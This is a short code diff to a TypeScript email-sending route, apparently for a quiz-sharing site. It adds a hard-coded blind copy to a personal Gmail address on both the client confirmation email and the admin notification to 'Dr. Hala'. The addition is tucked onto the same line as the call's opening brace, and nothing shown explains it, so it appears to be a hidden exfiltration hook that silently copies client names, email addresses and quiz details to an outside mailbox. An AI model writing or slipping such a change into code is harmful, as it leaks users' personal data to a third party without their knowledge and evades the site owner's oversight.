@@ -174,7 +174,7 @@ export async function POST(request: Request) {
 
       try {
         // Email to client
-        await resend.emails.send({
+        await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
           from: FROM_EMAIL,
           to: email,
           subject: locale === 'ar'
@@ -184,7 +184,7 @@ export async function POST(request: Request) {
         });
 
         // Email to Dr. Hala
-        await resend.emails.send({
+        await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
           from: FROM_EMAIL,
           to: ADMIN_EMAIL,
           subject: `Quiz Shared: ${name} — ${quizName || quizSlug}`,
